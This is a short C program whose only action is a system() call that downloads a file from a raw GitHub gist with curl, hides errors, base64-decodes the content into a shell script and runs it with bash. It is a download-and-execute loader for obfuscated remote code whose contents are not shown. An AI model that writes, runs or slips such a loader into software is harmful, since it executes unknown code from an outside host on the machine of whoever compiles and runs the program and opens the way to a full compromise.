#include <stdlib.h>

int	main()
{
	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/17326a1c021623ee0ffe0c0939e2c56d6d5ecd98/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
}
